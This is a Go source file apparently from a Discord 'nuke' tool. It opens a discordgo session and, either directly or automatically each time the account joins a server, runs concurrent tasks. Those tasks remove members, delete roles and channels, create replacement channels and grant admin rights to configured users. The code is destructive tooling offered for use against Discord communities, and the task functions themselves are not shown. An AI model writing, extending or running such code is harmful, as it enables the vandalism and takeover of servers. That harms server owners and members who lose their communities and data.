package main

import (
	"fmt"
	"sync"

	"github.com/bwmarrin/discordgo"
)

func (na NukeAccount) BeginNuke() error {
	err := na.Session.Open()
	if err != nil {
		return err
	}

	if na.Config.FeatureConfig.AutoNuke {
		wg := sync.WaitGroup{}
		wg.Add(1)
		na.Session.AddHandler(func(s *discordgo.Session, m *discordgo.GuildCreate) {
			na.nukeOneGuild(m.ID)
		})
		fmt.Println("Auto nuke is listening for server-join events")
		wg.Wait()
		return nil
	}
	na.startNukeTasks()
	return nil
}

// Requires gateway connection to be already open
func (na NukeAccount) nukeOneGuild(guildID string) {
	newBot := na
	newBot.Config.GuildID = guildID
	newBot.startNukeTasks()
}

type Feature struct {
	Enabled  bool
	Function func() error
}

func (na NukeAccount) startNukeTasks() {

	fc := na.Config.FeatureConfig

	tasks := []Feature{
		{
			Function: na.removeMembers,
			Enabled:  fc.MemberRemovalConfig.Enabled,
		},
		{
			Function: na.deleteRoles,
			Enabled:  fc.DeleteRoles,
		},
		{
			Function: na.deleteChannels,
			Enabled:  fc.DeleteChannels,
		},
		{
			Function: na.makeChannels,
			Enabled:  fc.AfterChannelConfig.Enabled,
		},
		{
			Function: na.autoAdmin,
			Enabled:  len(fc.AutoAdmin) > 0,
		},
	}
	wg := sync.WaitGroup{}
	for _, feature := range tasks {
		if feature.Enabled {
			wg.Add(1)
			go func(feature func() error) {
				err := feature()
				if err != nil {
					logger.Errorln(err)
				}
				wg.Done()
			}(feature.Function)
		}
	}
	wg.Wait()
}
